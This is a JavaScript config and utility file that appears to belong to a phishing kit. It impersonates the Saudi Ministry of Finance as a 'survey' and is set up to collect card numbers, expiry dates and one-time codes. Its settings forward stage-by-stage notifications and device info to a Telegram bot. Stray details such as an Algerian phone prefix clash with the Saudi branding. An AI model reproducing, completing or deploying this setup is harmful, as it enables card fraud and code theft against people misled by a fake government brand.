const CONFIG = {
    TELEGRAM_BOT: {
        TOKEN: 'YOUR_BOT_TOKEN_HERE',
        CHAT_ID: 'YOUR_CHAT_ID_HERE',
        API_URL: 'https://api.telegram.org/bot',
        SETTINGS: {
            SEND_STAGE_NOTIFICATIONS: true,
            SEND_FINAL_SUMMARY: true,
            SEND_DEVICE_INFO: true,
            PARSE_MODE: 'Markdown',
            DISABLE_WEB_PAGE_PREVIEW: true,
            DISABLE_NOTIFICATION: false
        }
    },
    SYSTEM: {
        VERSION: '4.0.0',
        RELEASE_DATE: 'ديسمبر 2024',
        BUILD_NUMBER: '20241229',
        ADMIN_EMAIL: 'surveys@mof.gov.sa',
        SUPPORT_EMAIL: 'support@mof.gov.sa',
        SUPPORT_PHONE: '920020000',
        OFFICIAL_WEBSITE: 'https://www.mof.gov.sa',
        SESSION_TIMEOUT: 30 * 60 * 1000,
        AUTO_SAVE_INTERVAL: 60 * 1000,
        MAX_INACTIVITY_TIME: 15 * 60 * 1000,
        MAX_LOCAL_STORAGE_ITEMS: 50,
        ENABLE_LOCAL_BACKUP: true,
        COMPRESS_LOCAL_DATA: false,
        ENABLE_ENCRYPTION: true,
        MIN_PASSWORD_LENGTH: 8,
        MAX_LOGIN_ATTEMPTS: 5,
        LOCKOUT_TIME: 15 * 60 * 1000,
        API_TIMEOUT: 30000,
        MAX_RETRY_ATTEMPTS: 3,
        RETRY_DELAY: 1000,
        CHECK_INTERNET_INTERVAL: 30000
    },
    VALIDATION: {
        PHONE_PATTERN: /^(5|6|7)[0-9]{8}$/,
        CARD_PATTERN: /^[0-9]{16}$/,
        CODE_PATTERN: /^\d{4,6}$/,
        EMAIL_PATTERN: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
        NAME_PATTERN: /^[\p{L}\s]{3,100}$/u,
        NAME_MIN_LENGTH: 3,
        NAME_MAX_LENGTH: 100,
        PHONE_MIN_LENGTH: 9,
        PHONE_MAX_LENGTH: 9,
        CARD_MIN_LENGTH: 16,
        CARD_MAX_LENGTH: 16,
        CODE_LENGTH_OPTIONS: [4, 6],
        MIN_YEAR: 2025,
        MAX_YEAR: 2035,
        MESSAGES: {
            REQUIRED_FIELD: 'هذا الحقل مطلوب',
            INVALID_PHONE: 'رقم الهاتف غير صحيح. يجب أن يكون 9 أرقام تبدأ بـ 5 أو 6 أو 7',
            INVALID_CARD: 'رقم البطاقة يجب أن يكون 16 رقماً',
            INVALID_CODE: 'يجب إدخال 4 أو 6 أرقام فقط',
            INVALID_EMAIL: 'البريد الإلكتروني غير صحيح',
            INVALID_NAME: 'الاسم يجب أن يحتوي على حروف فقط (3-100 حرف)',
            CODES_MUST_DIFFER: 'يجب أن يختلف الرمز النهائي عن الرمز التجريبي',
            AGREEMENT_REQUIRED: 'يجب الموافقة على الشروط والأحكام',
            INVALID_EXPIRY: 'تاريخ الصلاحية يجب أن يكون 2025 أو أكبر'
        }
    },
    LANGUAGES: { SUPPORTED: ['ar', 'en'], DEFAULT: 'ar', FALLBACK: 'ar' }
};

function generateYears() {
    const years = [];
    const currentYear = new Date().getFullYear();
    const startYear = CONFIG.VALIDATION.MIN_YEAR || 2025;
    for (let year = startYear; year <= currentYear + 10; year++) years.push(year);
    return years.reverse();
}

function getCurrentTime(language = 'ar') {
    const now = new Date();
    const locales = { 'ar': 'ar-SA', 'en': 'en-US' };
    const options = {
        year: 'numeric', month: 'long', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        timeZone: 'Asia/Riyadh'
    };
    return now.toLocaleDateString(locales[language] || 'ar-SA', options);
}

function generateParticipationNumber() {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = Math.random().toString(36).substring(2, 6).toUpperCase();
    const prefix = CONFIG.SYSTEM.VERSION.split('.')[0];
    return `MOF-${prefix}-${timestamp}-${random}`;
}

function formatPhoneNumber(phone) {
    if (!phone) return '';
    const cleaned = phone.replace(/\D/g, '');
    if (cleaned.startsWith('213')) return `+${cleaned}`;
    else if (cleaned.length === 9) return `+213${cleaned}`;
    return phone;
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { CONFIG, generateYears, getCurrentTime, generateParticipationNumber, formatPhoneNumber };
}
